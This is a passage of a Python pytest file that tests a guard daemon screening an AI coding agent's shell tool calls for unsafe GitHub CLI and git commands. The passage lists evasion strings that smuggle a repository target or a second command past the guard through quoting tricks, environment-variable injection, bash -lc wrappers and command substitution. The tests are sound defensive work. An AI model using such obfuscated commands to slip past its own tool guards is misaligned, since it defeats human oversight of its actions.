        "gh pr view 1 -cROwner/Repo -R owner/repo --help",
        "gh -Rghe.example/owner/repo pr view 17",
        "gh -R'$OWNER/repo' pr view 17",
        "name=GH_REPO; export $name=ghe.example/o/r; gh pr view 1",
        "name=GH_REPO; declare -x $name=ghe.example/o/r; gh pr view 1",
        "env --split-string='GH_REPO=ghe.example/o/r gh pr view 1'",
        "env -S 'GH_REPO=ghe.example/o/r gh pr view 1'",
        "gh pr view 1 $REPO_ARGS",
        "REPO_ARGS='--repo ghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'",
        "env REPO_ARGS='-wRghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'",
        'gh pr view "$(gh pr view 1 --json number --jq .number)"',
        'gh issue view "$(gh pr view 1 --json number --jq .number)"',
        'gh pr view "prefix$(gh pr view 1 --json title --jq .title)"',
        '"gh" pr view "$REPO_ARGS"',
        'command -- "gh" pr view "$REPO_ARGS"',
        "g'h' pr view $REPO_ARGS",
        'g"h" pr view $REPO_ARGS',
        "g\\h pr view $REPO_ARGS",
        '"/usr/local/bin/gh" pr view $REPO_ARGS',
        "gh pr view 'x\\' ; gh pr view ${PR_NUMBER}",
        "env REPO_ARGS='--repo ghe.example/o/r' bash -lc '\"gh\" pr view $REPO_ARGS'",
    ),
)
def test_bridge_real_daemon_keeps_unsafe_github_pipeline_companions_reviewed(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    unsafe_command: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    session_workspace.mkdir()
    store = GuardStore(guard_home)
    daemon = GuardDaemonServer(store, host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "Bash",
                "tool_input": {"command": unsafe_command},
                "cwd": str(session_workspace),
            },
        )
    finally:
        daemon.stop()

    assert response != {}


@pytest.mark.usefixtures("native_hook_force")
def test_bridge_real_daemon_uses_exec_command_workdir_for_verified_git_fetch(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard_home = tmp_path / "guard-home"
    session_workspace = tmp_path / "projects"
    repository = session_workspace / "example"
    repository.mkdir(parents=True)
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
        check=True,
    )
    guard_config = load_guard_config(guard_home)
    assert guard_config.mode == "prompt"
    assert guard_config.security_level == "balanced"
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "exec_command",
                "tool_input": {"cmd": "git fetch origin main", "workdir": str(repository)},
                "cwd": str(session_workspace),
            },
        )
    finally:
        daemon.stop()

    _assert_bridge_denied(response)


@pytest.mark.parametrize("workdir", ("relative/repository", "/"))
def test_bridge_real_daemon_rejects_untrusted_exec_command_workdir(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    workdir: str,
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "exec_command",
                "tool_input": {"cmd": "git status --short", "workdir": workdir},
                "cwd": str(workspace),
            },
        )
    finally:
        daemon.stop()

    assert response != {}


def test_bridge_real_daemon_rejects_temp_root_workdir_without_falling_back_to_repository(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard_home = tmp_path / "guard-home"
    repository = tmp_path / "repository"
    repository.mkdir()
    _ = subprocess.run(["git", "init", "--quiet", str(repository)], check=True)
    _ = subprocess.run(
        ["git", "-C", str(repository), "remote", "add", "origin", "https://github.com/example/project.git"],
        check=True,
    )
    temporary_root = Path(tempfile.gettempdir()).resolve()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "exec_command",
                "tool_input": {"cmd": "git fetch origin main", "workdir": str(temporary_root)},
                "cwd": str(repository),
            },
        )
    finally:
        daemon.stop()

    assert response != {}


def test_bridge_real_daemon_ignores_workdir_for_opaque_tool(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    guard_home = tmp_path / "guard-home"
    workspace = tmp_path / "workspace"
    workspace.mkdir()
    daemon = GuardDaemonServer(GuardStore(guard_home), host="127.0.0.1", port=0)
    _start_daemon(daemon, monkeypatch)

    try:
        response = _daemon_hook_response(
            daemon,
            guard_home,
            query=urlencode({"guard-home": str(guard_home), "home": str(tmp_path)}),
            payload={
                "hook_event_name": "PreToolUse",
                "tool_name": "opaque_tool",
                "tool_input": {"command": "git status --short", "workdir": "/"},
                "cwd": str(workspace),
            },
        )
    finally:
        daemon.stop()

    _assert_bridge_denied(response)
